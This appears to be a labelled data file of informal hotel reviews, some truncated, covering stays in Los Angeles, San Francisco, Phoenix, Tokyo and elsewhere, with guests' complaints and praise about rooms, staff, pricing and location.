"worst hotel of holiday without doubt, the worst hotel that we stayed in during our 3 week holiday in the states. it is situated alongside a very noisy seven lane motorway, and the only way to drown the noise was to turn the air-con up to very high so that there was an acceptable level of noise inside the room. the furnishing of the room was very delapidated and none too clean.immediately adjacent to the hotel, they were demolishing some old buildings, so there was airborne dust and debris falling onto guests who were using the swimming pool, plus the associated noise of this work, something that we had not been advised of when booking.the road between the hotel and the famous walk of fame is badly in need of repair on the broken and debris littered pavements. plus, it is a fairly intimidating walk when you are continually confronted by people begging for money, and the obvious drunks and druggies in that area.after breakfast, you can not get a snack or a drink at either the hotel or the swimming pool until the evening, unless you use the very limited vending machines.the staff are very ignorant, and are more concerned with talking to one another, than with the needs of the guests. and all seem only tip orientated. very definitely the hotel is not up to the standards of u.k. holiday inns, and certainly could not meet up with brit. requirements as a holiday hotel.the drinks at the bar, and the meals at the dining room, are very much overpriced, and there is no entertainment available. and other people that we met there, who were also most dissatisfied with every thing, and duly complained, were told, well what do you expect it is only a 3 star hotel!!. plus others who had, like us stayed in vegas prior to coming to this establishment, had pointed out that it cost exactly double the price for the room at this hotel, with none of the facilities that they had in vegas.the food at the hotel is very limited as well as being way overpriced, and once ordered, they bring your first course, along with your bill, which includes a 15 percent service charge. now i have no objection to paying a service charge if i am given service, but surely that decision must be at my discretion, not on the whim of some surly waiter or the hotel to decide for non existent service.all in all, a very poor hotel, and one that should be removed from brit. holiday brochures as being totally unsuitable for purpose.the concierges at the hotel are continually pushing the various trips that are available to the guests, and i would suggest that you give the tour of the stars homes a miss, as all you see are hedgerows, gates rooftops, a total and again overpriced joke.one saving grace of our stay there,was the trip to universal studios which must be recommended, absolutely superb. but under no circumstances must you book it through the concierge, as it is much, much cheaper if you get your own ticket at the gate when you get there. also, request the free shuttle bus to the studios from the hotel, as the concierge will not tell you about this, as he wants to push for the package deals on offer, so will not tell you about this aspect. i wonder why?all in all, this hotel should be designated as a motel just for transient clients rather than as a venue for a foreign holiday tourist, and we certainly would not stay there again, so be warned.",0

"stylish with excellent service and attention to detail the park hotel tokyo was an excellent hotel that was suprisingly affordable.the park hotel tokyo is a newer hotel that occupies the top floors of a building in the recently build shidome complex which is located just below the popular ginza neighbourhood in tokyo. the hotel is directly connected to the shidome subway stop which is on the toei oedo line which my girlfriend and i found was an excellent starting point to go to the various neighbourhoods in tokyo. most sights are a maximum of one transfer away. a little further walk can get you to the shimbashi station and another metro line that is useful for taking you to other areas of tokyo directly.the hotel is very modern in design and had a truly boutique feel about it. the view from the hotel lobby on the 25th floor is stunning and features an excellent view of the tokyo tower and mt. fuji. the check-in process is effortless and the staff is very accommodating and always provided quick and useful advice on issues ranging from restaraunt suggests to directions to timetable information for the narita express trains.the rooms are an adequate size and well furnished with a flat screen tv, a mini bar and an in room safe. the entire hotel is spotlessly celan. the bathroom is effecient and supplied with nice amenities such as toothbrushes, razors and soaps and shampoo.we ate in the asian themed restaraunt and it was good but quite expensive, especially when compared to the countless local restaraunts that are scattered through many of tokyo's neighbourhoods.there is a convenience store in the basement of the building on the way to the subway that is open 24 hours. there is also a starbuck's coffee shop and a variety of restaraunts in the basement of the building which looked good but we didn't have a chance to eat there. it looks like their hours are mostly oriented towards catering to the office workers lunches and dinners.as for booking, i found that the best rate was avaiable through tablet hotels but there was a service fee added to our bill which could have made it on par with booking directly through the hotel's website (to be honest i didn't look into whether it would be added by hotel as well). regardless, my average rate was $200 canadian which i think is reasonable for the quality of the hotel in tokyo.i would stongly recommend this hotel to people looking for a stylish hotel in tokyo at a resonable price. it is particularly attractive if you are unintimi",0

perfectly fine i recently stayed there while attending a convention. as long as you can keep in mind that it is an older property you will be pleased. the bedding was fabulous and the service i received was as well. they could use some new carpets and some cosmetics but other than that i would recommend staying there. my cell phone worked great (i saw another person had a problem).,0

"pretty close to perfect i had fallen in love with the sofitel in chicago so i was curious to see how the one in l.a. stacked up and once again i was blown away.the management and staff were extremely accomodating and helpful, room service was quick (get simon's junk food selection with cotton candy and cupcakes and order in a movie one night), the pool was the warmest heated pool i had ever gone swimming in, the architecture and design of the hotel, spa, restaurant and bar was beautiful, and we even had a celebrity spotting--ice t!the hotel is right across the street from the beverly center so we had plenty of choices for shopping and restaurants but it's still quite a walk to rodeo drive and other hot spots.and don't let cab drivers scam you from lax! it should only be $40 and we paid $71! that was the only time i gritted my teeth during our stay but that wasn't the hotel's fault it was our own and the shady cab driver's.a soak in their suite's hot tub though did the trick. if you get a suite, the huge bathroom has a tv by the tub and i took advantage of it every day. such a wonderful experience, i hope to return soon.",0

"absolutely fine we stayed at the sleep inn on the 15th may. we wanted somewhere to stay when we arrived in phoenix at night before picking up a car the next day.first the not so good news. we rang up for the shuttle bus when we got to the airport and were told it would be 20 minutes. we waited for 40 and it didnt arrive, we rang again and were told it was on its way. we waited another 20 and it still didnt arrive. in the end we just got a taxi.the good news was that when we got to the hotel which is about 5 minutes away we got an immediate no questions asked refund for the taxi and apologies. they really dont seem that well set up shuttle bus wise. when we got it in the morning it was a plain van, all the other hotels had buses with their logos plastered all over. (on another note the bus only goes on the half hour so book early and be prepared that you may not get the slot you want)the room was fine, good size, comfy bed and it had a microwave and a fridge. the vending machines had loads of microwave meals and similar stuff which was very handy for one night.all in all the room did exactly what we wanted and had a very convinient location, if they can sort the shuttle out it will be really good.",0
you get what you pay for..... after reading the reviews we were expecting a little bit better than we got.first of all the area it is very close to kings cross and there are alot of backpackers properties on the same road - plus side is there is a wide variety of cheap eating places if on a budget - minus side we didnt always feel safe walking home in the evening. the hotel itself looks great from the outside but the rooms are looking quite,0
"springtime in the mediterranean..errr..seattle introductioni stayed at the med. for 3 nites at the end of april to early may 2004.i had been intrigued by the reviews and the ads, pictures, etc that i had seen online.costi ended up reserving a room through expedia. i tried doing it online directly with the hotel, however their system indicated no vacancies. cost was $125 cdn/nite for a queen sized room. i was a bit late in booking, if i had booked a week earlier i would have saved $10/nite.locationi have never stayed in the queen anne area and must say i like it! lots of amenities directly nearby and it is a somewhat upscale/trendy residential area.enjoyed the restaurants and cafe's that were nearby. safeway across the street and qfc (24 hrs) a block away. good places to load up on a few drinks or snacks and store it in the room. bank right across the street with atm, as well as atms in both the aforementioned grocery stores. late night you can get a cheap burger kitty corner to the med. at dicks. i was a bit off on where it was located. if you look on a map, the hotel is right on the corner of republican and queen anne n. it is two very short blocks to hitting the edge of seattle center. if you go this route, immediately to your right is key arena. several times i cut through seattle center and jumped on the monorail to go downtown. there also are a number of transit buses right on queen anne a half block up from the hotel that'll take you downtown along to pike place market or safeco.room/servicethe room was as i expected. not a suite, but a good sized room, well laid out. had a 27 inch tv, vcr, telephone, microwave, bar sized fridge, kitchen sink and small coffee maker. a couple complimentary cans of coke were in the fridge and on the counter they had complimentary starbucks and microwave popcorn that was replenished daily.no dishes as was mentioned by someone else, you can call the front desk to get cutlery, dishes or whatever else you'd like for free.furniture was fairly new. bed was a bit soft, but otherwise fine. kitchen had a bath/shower combination and everything was clean and flawless. i didn't try the small work out room, but there is one on the main floor. room service was prompt. i had no problem with noise from other guests. the insulation between rooms was good. only time i heard noise was when the windows were wide open and when housekeeping was banging around and vacuuming the room upstairs.hotel staff were efficient and quick. no problems accepting and processing the expedia reservation. they took a credit card imprint in the event of incidental charges. it was unseasonably warm and since i was on an upper floor, the sun and heat penetrated the window and flimsy vertical blinds. my room had no airconditioning. the lack of aircon could be a big problem in the summer. there were two windows that did open, but it wasn't possible to get a cross-breeze. a floor standing fan of a decent diameter would be really useful come summer and i have no idea whether or not the hotel offers that. i would definitely check.sorry for the lengthy review!conclusiongood location, amenities, and value. room was clean and up",0
"run away from this hotel! spend more money and stay somewhere else!it was our first day in the us and we had to stay at the herbert hotel in sf. the hotel was horrible. the bath was full of hair. they did not tidy up the room the next morning (we stayed 3 nights in total). there was no remote control for the tv. the sheets were full of holes and blood. it was even worse. it was so loud (police sirenes all night long). the reception stuff was more than unfriendly. the shower did not work.and worst - they gave our room key to somebody else while we were in the room! they forgot that the room was already booked! so while we were in bed, we were very shocked, when somebody suddenly entered! so, stay away and go elsewhere. only positive point about the hotel is the area. it is walking distance to union square and the powellhyde cable car.",0

"nice hotel ... but you'll pay $$$ for it overall, the hotel is very nice and has all the amenities of a 4-star hotel ... although the price per night the seemed a little high for what you got ... i guess you're paying for location. i stayed at the century plaza for a business trip, so i didn't pay out of my pocket or else i couldn't afford it.the hotel is located in a business section of century city. there is a westfield mall right next door that offers a variety of eating options and shopping. i chose to eat there rather than hopping in a cab and venturing out somewhere.pros: comfy beds, modern decor, fairly large room, patios are nice, starbucks onsite, huge flat screen tvs.cons: no free exercise facility (need to pay $20 per day to use equinox next door), very expensive onsite restaurants, no free wi-fi, noisy ac in room, a bit of a ride from lax",0

"mixed review...... first, i ended up going to sirenis because apple vacations messed up my plans to go to sunscape tulum in cancun, mexico. if going on a trip. i would not use apple vacations ever again. first negative, the transfer taxi from airport to hotel was not included. $60 to, $50 back us. after paying $1300 plus for the package you would think transfers would be included. first interesting observation, speedometer in taxi did not work, and roads were in terrible condition. many potholes. red light was not followed by anyone. get to hotel, first positive, the reception desk person knew who i was, and was expecting me. second negative, the room did smell a little musty, but that went away as i spent some time there. then the air conditioner went off. two maintenance workers spent 45 plus minutes and got it working...second positive. third negative... they had a board with activities...but it did not tell you where the activities were. i think they would be better off have a printout and giving it to people at check out the point out where things are. fourth negative....monday night football was on a small t.v. in the sports bar...which closed at 11 pm. that's 10 p.m. us...so i only got to watch first half before i went back to my room to watch the rest. i was suppose to be in cancun watching the game on a big screen on the beach...so this was a major disappointment to sirenis and apple vacations at this moment. then another negative would be that my printout said all meals and drinks were inclusive, but when i got to disco, they told me i had to pay. when i took it up with management of the hotel and showed them the printout...of their hotel, they told me it was wrong and there was nothing they could do. i felt this was a major no no for customer service. they could have accommo",0

"no respect for teenagers my son arrived only to find that they would not rent a room to him. just because he did not hold a credit card, even though he had permission to use his parents, and we called to verify. we were told this could only be arranged during office hours. it was now late, office hours were over, i would have thought that the manager could make the decision. but he told me no. they had nowhere else to go. the manager suggested a grungy hotel down the road. they had cash, and our credit card and we even talked to the manager, but he told us he could not make any exceptions, as this would be discrimination. i think that it is discrimination to the teenagers, as they would not rent to them with our approval, written or verbal. i can make purchases online, but somehow i could not even place my credit card as security for the price of the room and other expenses. some policies are too strict and some exceptions should always be allowed. i spoke to best western head office and they told me that all best westerns were individually owned and operated, therefore the policy was only with this one hotel. so why couldn't the rule be bent a little? it wasn't alot to ask for. let the decent kids have a good place to stay, no you treat them like scum and you wonder why our kids are the way they are today. wow !!!!!!!! so if you decide to stay here, beware of policies.",0

"exceeded expectations my family, consisting of my husband and myself and our four children ages 15 to 28 plus the girlfriend of one of our sons stayed at the best western hospitality house friday through sunday. i had read about how big the suites are but i honestly was still amazed when i saw the one we got for the kids. it had two very large bedrooms, one with twin beds the other with a queen and a queen size sofa bed in the living room. there was a great sized living room with a table that could seat 8 and a very nice kithchen with a full size coffee maker.my husband and i had a one bedroom suite with a large bedroom and living room and full kitchen. the only complaint would be that there was only a full sized bed in the bedroom. when you are used to sleeping on a king, full size just doesn't give you enough room.there is no restaurant in this hotel but bagels, juice, milk and cereal are provided each suite and since there is a full sized refrigerator, we could have filled it with anything we wanted.this hotel is neat as a pin. the decor is sort of contemporary/retro and all the furniture was in good shape. better lighting in the living room and single serving peanut butters to add to the cream cheese and jam for the bagels would be about the only two things i thought would be an improvement in this otherwise terrific place.",0
"charming chelsea lodge our family of four has been all over, and we've stayed in every kind of lodging -- from five star hotels to very personal, homey bbs -- and each one of us loved our time at the chelsea lodge.we stayed in one of the larger units, a parlor suite, and were surprised and delighted at the level of decoration and attention to detail for such a very inexpensive stay. this may be budget accommodation in price, but not in style, and certainly not in cleanliness! i only wish my own home would be so sparkling all the time!our 13 year-old daughter slept on the spacious futon in the living area, while a separate cot (also quite comfortable) was brought in for our 9 year-old. the kitchenette was well-appointed and very useful for storing snack items, and the marble bathroom has a great shower.the location, in the heart of lovely chelsea, is another big plus for this place; it's a little oasis of green and quiet to come 'home' to after a busy day in the city.there's nothing like having your own apartment in wonderful old nyc, and if you stay at chelsea lodge suites, that's just what you will get.",0

"nice hotel the hotel is nice, it is a little outdated, but nothing i would complain of (mexican tiled floors in the front desk area with fountain). my boyfriend and i went there last week for spring break. the weather was awesome and they have a nice pool area, so we spent most of our time there. you can see small mountains/hills out your room window. rooms are roomy and the maid service is prompt. front desk is very friendly, we had lots of questions about the area and they knew all about it. they have a complimentary shuttle service and will drive you any where within a 5 mile radius...the drivers are very nice and are willing to make sure you get where you want, we didn't have a car, so this became very nice to have. this is not a five star hotel, but for the price we got it for i would not complain. the rooms are ok, but the service is excellant, and it is nearby lots of resturants and a mall, some you can even walk to. hint for spring breakers: i would stay here again but if i wanted to enjoy the college scene, i probably would not come here again, not a lot of action near by and was quiet, but that is what we wanted, so if you want a relaxing stay come here, but if you want to be near all the bars etc, go somewhere else.",0

the best breakfast room at lax stayed here for 4 nights late may to attend a convention next door..used seniors rate of $us 84 plus tax. the room was above average although the bed was not up to new starwood standard.the breakfast room buffet(including omlette station that delivered to your table) was exceptional although when taken to dinner by a transiting fellow australian and his daughter on saturday night it was a disaster..but then it seems all lax hotel restaurants seem to have problems on saturday night.. back to breakfast buffet;staff were discreet and courteous-highly recommended...outdoor pool was small for a 500 room hotel and the spa/whirlpool positivly minimalist (2 comfortable or 4 in a squeeze) the room maids always had a smile and pleasantries as you passed them and the front of house staff were exceptional although the hold mail system needs centralisation as there appears to be 3 seperate security locations to be checked...would recommend this 4 star hotel for the quality of its staff at all levels....,0

"18 night stay big let down we are a very well traveled family, and have stayed in many differenthotels around the world. this is our 15th stay in the us. this was supposed to be a very good quality hilton,not so! we had an 18 night stay. do not be fooled by the fantastic pictures in the holiday booksof the pool. looks fantastic but it was freezing cold as was the river ranch(though that was heated by the third day)we always phone any hotel prior to booking as we have a disabled child that can not go into cold water ,we were assured that the pool was heated all year round.to 78/82 after complaining as did other guests, we were told so many differentexcuses too many to say but all were rubbish.in the end the pool stayed friged and unusable for the full 18 nights.no one could use the pool. we tried to complain every day nothing was ever done.also out of all the hot tubs none were working, some had no lights around them working, the bubbles did not work and some were also cold. the tiles were chipped and hanging off. which meant sharp edgesour chill out time to sit in one with a glass of wine when the kids were in bed..did not happen. when we tried to compain we were told that it would be rectified but in the mean time we were told to walk from our room accross a very large dark car park through the lobby and try the one there!! the lights did not work!! nor did the bubbles. they did manage to heat one but that was all, no lights and when we put the bubbles on it emptied the hot tub.the ranch staff....(except little old lil) rude abrupt slack sevice, the food was at best a fast food cafe, as we have stayed in the us somany times were very well accustomed to the tipping culture. we always tip, what we do not like nor appreciate is being told that the bill does not cover their gratuity/tip while we were still in themiddle of our meal. on many different occaisons the order was wrong, we did not get cutlery, the drink was sloshed over the table as it was slammed down, our daughters we not even spoken to nor was there any pleasant banter. even after all this we still tipped $150 in the first week hoping to get a better sevice.!!(one day our 9yr old founda large black hair in her breakfast!!) we never complaind about any of this but we know of canadians and americans that we befreindedbooked out to go and stay in the scotsdale hospitality suites (we aslo have stayed there in the past its fantasic) the front desk staff at the hilton appeared nice enough but actually did nothing to help.the whole hilton experiance has led us to book to go to tunisa north africa where we know we will get better treatment at a fraction of the cost. the tattersall family united kingdom",0

excellent - lovely neighbourhood - great apartment a nice surprise. we stayed in the suites rather than the lodge. we had a parlour suite - the very front basement room facing the street. it's like staying in a nice apartment rather than in a hotel. why pay hotel prices when you can have the privacy of a comfortable apartment ! what a great comfortable apartment and a wonderful location. close to shops and metro stations. the only two negatives were a nosiy neighbour how insisted on re-arranging his apartment at 6am (no fun with jet lag) and the some of the decor was a little dated. wireless internet worked really well. very happy with that.all in all - a good experience - would stay again without hesitation.,0

"terrific value! great service!! recently spent several days in arizona i pricelined a sat/sun night at the radisson for $42 a night. some hotels are a little snippy if you snag a great deal, but the radisson staff were exceptionally gracious. my room on the 5th of 6 floors was spacious, clean, and lovely beyond expectations. the bathroom was quite large by most hotel standards the shower had one of those cool curved shower rods that gives a few extra inches of space. never used one before but i immediately went home and bought two for my house.the mattresses had all been recently upgraded to the comfort select sleep number bed. never used one before either, didn't buy one but it was quite comfortable and fun to play with. used room service the delivery was speedy, food hot a decent value. i was impressed with the range of selection in the menu. prices are high, but typical for this tier of hotel.as mentioned, not a lot within walking distance. free parking, free 24 hour business center with two pcs and a printer, 24 hour sundry shop attached to the reception desk, nice seating area by the lobby for quiet conversations, black-out drapes in the rooms and a floor layout that minimizes walk-by traffic headed towards the elevator.i did share my room with a cricket, but this was true of 3 out of 4 hotels i used during my trip. maybe it's just an added good luck feature or perhaps i traveled during the wrong time of the year. the floor to ceiling, lined drapes sheers make locating the critters a challenge that just isn't worth it at 3:30 am.i'd definitely try to stay at this location again. great for business or romantic travel, maybe not so geared for younger children. very easy access to the i-10 and convenient for the airport, arizona mills outlet shopping and ikea.",0

"good solid hotel bid priceline $39 per night plus fees. read that there is a $16 charge for parking, parked about six blocks away near a asu offsite building. meters work 9am to 5pm, other times appear free. checkin was easy, up to the room, seem to be remodeled in the last ten years. nothing special, but nothing bad either. the pool and fitness center were next to each other. fitness center had newer machines with video, free weights are nil except for some dumb bells. water cooler, towels and headsets are provided, 24 hour access. i asked the desk person if there was a drugstore within walking distance, he replied no, but a circle k was within a 10 minute walk. i would not walk in the dark for 10 minutes near downtown, i would suggest the same to you. the bagel store in the lobby was open and overpriced, but convenient. i scored another parking space on the street the next evening, three block walk. the hotel was busy with a convention going on. bar and restaurant in the lobby and also across the street. there was a breakfast place, first watch, about one block away towards first street. i had a good stay.",0

"adante will see our family again the adante suited our 6 night stay including a 14 month old. the front desk clerk upgraded our room to a suite for $10 per night, this was very affordable due to original nightly rate being $60 odd dollars. i appreciated that the clerk recognised we needed a little more room with tour toddler. i can recommend the adante without a problem for families who wish to spend money on other things such as sight seeing etc. the room was newly renovated with big screen tv's in both king size bedroom and lounge that also converted into a fold out bed. the bathroom very clean and modern, in fact we were very satisfied with all the room features. fresh coffee to brew when your room was made up every day, we had a back room which was very quite though i don't mind the noise in any case (sirens etc). the locality was great with union square and transport close, a walgreens is a 2 minute walk on geary street so when any snacks or drinks required they could be collected close by. the staff were friendly and one afternoon is was too wet to venture out so we sat in the attached cafe with a delicious coffee (they serve beer too) and watched the world go by out on geary street. family friendly restaurants are within 2 minutes walks from the hotel (diners or similar) so after dark you don't have to stroll to far in this is an issue. we'll give the adante 10/10 for great value for money.",0

"the omni is good i don't have that much to add to all the deserved praise the omni has received. we got a $125 weekend rate, which we considered a fine bargain, though $26 for parking was steep (the family couldn't agree to park on the street as some other people posting had done).my wife and daughter enjoyed the pool very much and could actually swim in it, unlike so many hotel pools. i was able to walk from the hotel to both the downtown standard (for early morning coffee since it's open 24/7) and little tokyo (for dinner). the latter walk took us through a few blocks mostly comprised of parking lots, which my wife and daughter complained about mightily, but (on friday night) there were always at least some people around and no suggestion of danger. (we took a very short bus ride back). we also walked to a very pleasant cafe/wine bar--open 7 days--at 4th main in the old bank renovation project. the omni is also literally adjacent to the main part of the museum of contemporary art (moca) as well as the other atractions folks mentioned.the omni is clean and quiet and smoothly functioning, almost unreal. we asked for a high floor, they got us onto the 13th, though it didn't quite get over the neighboring highrises (but kudos for having a 13th floor). not a lot of character to the hotel perhaps, but very very nice.",0

good and clean hotel this a cheap and very clean hotel in san francisco downtown. excellent position.we stayed here for 3 nigths and was a very good deal.the breakfast in simple but remember that the hotel is cheap!i advice this accomodation.,0
shiny front - shabby back. good for smokers. the brochures and website photos all laud the grand ballrooms and lobby. these are indeed magnificent but belie the rooms behind them. you can stay somewhere better and just walk in and look. at $usd185 a night we didn't expect to find our bathroom door off its hinges or the continuing struggle with room staff for such trivialities as providing more coffee satchets. the guy that fixed the door was resigned to the fact that he and his colleagues had a real job on their hands and told us we were lucky that we didn't have plumbing problems.parking is very expensive and the valets (compulsory valet service) get surly if not tipped extravagantly.on the plus side - for all those smokers out there - the biltmore's fire escape lobbies are not alarmed or monitored and open on to little balconies. just perfect for that quiet smoke without having to get dressed and leave the hotel.,0

"paper plates? my wife and i stayed here in august and found the place clean and presentable. the breakfasts were very bland but edible, the toasters only do one side so toast takes a while. but having your juice and coffee in polystyrene cups and paper plates in an hotel - well! the t is only yards away and on hiring a car had no trouble parking. eating is great in the area with vinny t's coming out on top. pino's pizza, a few doors from vinny's is also worth a visit if you are running out of cash - cheap and cheerful but good food.",0

"awsome place for kids and adults that are ""still kids"" !! we have custody of our 7 year old grandson and we found squaw peak on the hilton website. we wanted a fun place to take him and this looked like it was it. after booking, i became concerned after reading some of the tripadvisor reviews. having stayed in a number of hilton properties, i can tell you that if you have children, this is the place to go. the river ranch has multiple pools, a long lazy river for use with pool-supplied inner tubes, a water slide, and a kiddie pool. neat waterfall for kids and adults to play in. there is also a hot tub at the river ranch. food at the river ranch outdoor bar is the same price as any pool resort-a little pricey, but not outrageuos. but there are plenty of water stations at the pool with large containers of free cold water and plenty of cups along side. the only aspect that bothered me is that through the week, it closed at 8 pm. i thought that too early-especially with the temp hitting 112 degrees...the hole in the wall restaurant at the river ranch was good and the prices were very reasonable. we did not play the miniature golf only because it was too hot, but it looked fun. we stayed in a regular suite with 2 queen beds, and it was fine. very comfortable bed. no, you could not put personal items in the fridge, but we bought a styro cooler down the street at walgreens and kept it filled with ice from the ice machines located on every floor.if you are eating outside the resort, you will need a car. you can walk to aunt chiladas (good mexican food-neat atmosphere- very reasonable prices-good margaritas -you can purchase your own shaker to take home!) other than that, you will need to drive. good choices are claim jumper (good prices- kid friendly-neat menu choices-to die for 6 layer chocolate cake..it is a 10 dollar dessert, but feeds a host of people!) another fun place to take kids is the 5 diner. (juke box at every table, milk shakes served in the stainless shakers-terrific food real really reasonably priced..) pizza was good and inexpensive at streets of new york. we were only there for 4 days, so we did not go on any tours or day trips. but our grandson enjoyed the pools so much that it did not matter to us that we did not go anywhere else. after the pool closed at 8 pm, he could swim in our south-end pool complex. i thought the water was cloudy in the hotel complex pool, but he enjoyed it anyway. i was looking forward to using the hotel complex hot tub after the river ranch closed, but the first night, it was ice cold! it was warm the remaining nights, though...we did check out the hilton tapatio resort also in phoenix. again, if you have kids or are an adult that likes water play, stick to squaw peak! i did think the pricing for the squaw peak kids coyote camp was too high. but since our grandson was perfectly happy making friends in the river ranch water area, we did not use the camp. the river ranch is open later on fri and sat nights-they show an outdoor kids movie on sat nights. the kids can swim and watch a movie at the same time-that was kinda cool...it did bother me that there were no safes in the rooms-that needs attention!! and a 10 dollar a day charge for internet service was ridiculous-i would not and did not pay for that-even thought i took my wireless laptop with me. sorry, but that should be free!!! the staff was friendly and they all took a few moments and chatted with our grandson whenever he wanted to show them his latest purchase from a gift shop or needed scotch tape or glue for something he was working on..(much appreciated, staff!) and the lady at the 3rd floor kids concierge played a board game with him one hot afternoon-thanks! and the hotel concierge in the lobby really knew the area and what to recommend. he printed a map for us one night when we asked directions for an eatery. and they will print your boarding passes for you the day before you leave-that was a great help to us!i do think they need more handicapped parking. my husband requires handicapped parking, and it was always hard to find one available-especially during the weekend. but all in all, we had a really fun time just swimming, exploring the resort complex, trying out new restaurants-just spending some quality family time together. it was very relaxing and my grandson is ready to go again next year. ditto for my husband and i !!",0

"great place to stay--tuscan inn my 18-yr old dtr and i just returned from staying 4 nights at the tuscan inn in san francisco. we had never traveled there and booked the trip thru priceline. tuscan was wonderful! the rooms were clean and nicely decorated. the rooms were also quiet and we felt safe. the location was great, just a few blocks from fisherman's wharf. one day we got a day pass and took the cable cars and buses to view other parts of the city such as chinatown, golden gate park, painted ladies houses. the bus line we needed was just across the street and the cable car was a block away. again, the location was great! the 5-6 pm complimentary wine hour was a nice feature. they did have soda for younger people, but ran out so my dtr didn't get anything to drink. in the morning there is complimentary tea, coffee, hot chocolate and biscotti. we arrived at the oakland airport and took bart to get to sanfrancisco and then the f-line muni to get to fisherman's wharf. it was ok, but it took a good hour to get to our motel. it cost about $8 per person to travel this way. we decided to take a shuttle back to the oakland airpost. there was a shuttle that advertised $23 for one person and $10 for additional people...so it cost $33 which was worth it. it only took about 20-25 minutes by shuttle to get back to the oakland airport. i'd definately stay at the tuscan inn again. other places i'd recommend seeing include alcatraz (audio tour), muir woods tour, and biking the golden gate bridge.",0

"great location we stayed at the tuscan inn for 3 nights in april. it is in a great location, the rooms are clean and comfortable and the managers wine hour is a welcome bonus.there was a problem though that the hotel did not receive our request for a twin room and we ended up in a double for the first night. despite 3 requests and 3 promises for a rollaway bed, it never arrived. the night front desk personnel were disinterested and could not be bothered, although the day personnel were lovely and sorted another room for us.if you plan to be out and about most of the time you are in sf, i'd definately recommend the hotel. but if you want to relax in the hotel, then you'd be better choosing somewhere else.by the way, the hotel's restaurant is great. the food is lovely and the staff very friendly.",0

"would definitely return with the kids some resorts are great for adults and others great for kids, but this resort seems to do a good job of pleasing both. i came to it solo for a business conference but would definitely come back to it if i return to phoenix with the family. most of the hotel rooms are clustered in the front of the sprawling property at its north pointe and south pointe. the rooms in each pointe surround a courtyard with a small swimming pool. the conference rooms are between the two pointes but the hotel desk in the south pointe. i was in a nice suite in the north pointe that would comfortably handle a family of four. there was a living room with a pull-out couch, desk and widescreen for tv/internet, a bathroom and walkway in the middle, and a bedroom next to a balcony on the other side. in the back of the property are a four-acre mini-waterpark to the north which is exceptional, a kid's daycamp casitas suites in the middle, and a spa which includes a lap pool to the south. the casitas seem to be two story town house-type suites. the restaurant which is off the front parking lot was not real fancy but good food for a hotel and fine for a family. note that the waterpark has its own restauant, ice cream shop, etc. the property has lighted tennis courts but if you want to golf, you have to go four miles away to the sister hilton property. that other hilton property also has a fine upscale restaurant (a different point of view) which is highly recommended for adults but not really for kids). the staff was nice and my stay very pleasant. i'll probably be back with the family in the future.",0

"very nice rooms stayed at this resort for one week while at a business conference in phoenix. the one-bedroom suite was very clean and the bedding was exceptional. probably the best night's sleep i have ever had while staying in a hotel. we ate two breakfasts on site at the slim pickens restaurant. the first was a breakfast buffet on sunday and it was exceptional. all you can eat for 9.99. service was excellent. the second time we ate was during the week and breakfast cost more and was not very good. service was not acceptable. we thought that our young waiter had quit during our meal.the propery was very well kept. the only problem was the pool area where we were located. each area has its own pool. during the first few days of our stay, the pool was in disarray every morning. towels were not picked up and food and beverage containers were still everywhere from the night before. about wednesday, things changed and the pool area was spotless. possibly the person in charge of the pool was on vacation at the beginning of the week. another problem with the pool was a private company giving swimming lessons to small children. after a day of being in conferences, it would have been nice to just get into the pool, but that wasn't always possible. last, there are no pool rules posted and children were throwing balls, diving into the pool (there was a no diving sign), and many just being obnoxious. no real parenting going on there. the same could be said for the lazy river. luckily i wasn't there for a relaxing vacation.while i would consider staying there again because the rooms and staff were so nice, probably i would look for another place.",0

"fantastic hotel! i have used this site for a while and thought i should contribute at least by giving my review on my hotel stay. i hope this will help people choosing their hotels in la.i visited la, sf and ny from 7/12 to 7/24 and stayed in 5 hotels along the way. hyatt regency century plaza is by far the best hotel of the whole trip.stayed there between 7/12-16. picked up the hire car at the airport and drove to the hotel directly (omg the traffic!). got there at about 6pm and the valet parking was a bit chaotic. very limited space in front of the hotel. the lobby was very grand as you could expect from a hyatt. went to the receiption and told them my details and showed them my newly registered gold pass - was told that since we used an 'online agent', no points would be earned, except incidentals. nevermind, worth a try. the guy (alessandro or something) was very polite nevertheless. parking was about $30 i think with in/out. asked for a high floor room and got assigned a room on the 26th floor. tipped the guy ($20) as he was very helpful.thought we would be given the smallest room but to my surprise it was a very big king delux (could easily fit another bed in). it faced the ave of the stars and directly opposite the 2000 office building across the road. you could see a bit of distanced houses and even a bit of the sunset. although it's right on the main road, you couldn't hear much at all once doors to the balcony are shut. the balcony itself was carpeted and with two chairs and still space to move around. the bathroom was huge as well and plenty of toileteries. shower wasn't powerful though and there wasn't any space you can put the toileteries (no ledges no racks - a bit inconvenient).since we hadn't eaten since the morning, we hurrily went over to century plaza's well recommended food court. omg i was stuck! so many choices!! settled with sushi after 20 mins of checking out the counters and ate it outside - beware of the pigeons, their hungry eyes were quite disturbing.went down to gelson's to get some fruits and water etc. nice store but i would recommend the few stores close to (one open 24 hours i think) on sonta monica blvd, close to san vicente intersection. much cheaper. century plaza had all the famous brands though.went back to the hotel and checked out the pool and the gym. pools (one main and a coupe of splash pools for kids) were outdoors and were ok. i am not sure if it was a temp arrangement but the gym was next door (equinox) and needed to pay to use it. apparently it's very popular among the celebs and there was a long waiting list for memberships.express our discontent that we had to pay to use one basic hotel facility. that alex guy mentioned above whispered to the person we were talking to and immediately he offered some breakfast coupons to shut us up. the magic of tipping!so got to enjoy breakfast every morning and marie in the breeze restaurant who served us a few mornings was very attentative and we tipped her every morning too. food was ok, we chose buffet breakfast as it's easier. fruits were good with few choices of cereals. cooked section could be better as choices were limited. it was ok though. also newspaper daily by the time we got out of the room - probably one of the goldpass benefits..all in all, enjoyed my stay very very much. highly recommended. i think it's more a 5-star hotel than a 4-star in my opinion. i would definately stay there again given the chance.",0

"loved this place my wife and i spent 5 nights at the roosevelt in match 2007.we were worried because we had read some negative comments, but wondered what the hell the people were on about when we got there.check in went smoothly and the staff were very friendly and helpfull, from check in, to the concierge, to getting an iron delivered to our room.room was on 13th floor, was agreat size with a great bathroom and the most comfy bed we have ever slept in.had great view from our room looking over chinese theatre and the hollywood sign.everything is on your doorstep, from in and out burgers, yum, to a myriad great restaurants, and the best discount shoe shop in la just one block behind the hotel.would recommend staying here to anyone.",0

